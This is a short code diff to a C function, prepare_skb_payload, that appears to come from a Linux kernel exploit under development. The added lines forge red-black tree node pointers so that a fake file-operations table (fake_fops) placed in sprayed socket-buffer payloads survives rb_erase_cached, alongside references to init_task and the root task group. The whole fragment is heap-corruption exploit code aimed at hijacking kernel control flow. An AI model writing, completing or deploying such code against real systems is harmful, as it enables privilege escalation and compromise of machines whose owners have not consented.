@@ -482,6 +482,15 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
   uint64_t task_group = ROOT_TASK_GROUP;
   uint64_t pi_top_task = INIT_TASK;
 
+  if (pselect_custom_write == 4) {
+    /* rb_erase_cached() may call rb_next() on the replacement node.  Keep
+     * the target-8 parent shape, but use the payload fake_fops node instead
+     * of the real kernel fops table, which is not an rb_node. */
+    write_pc = fake_parent;
+    write_right = fake_fops;
+    write_left = 0;
+  }
+
   for (size_t chunk = 0; chunk < SKB_SEND_SIZE; chunk += ORDER3_SIZE) {
     unsigned char *p = skb_buf + chunk + SKB_FRAG_BIAS;
 
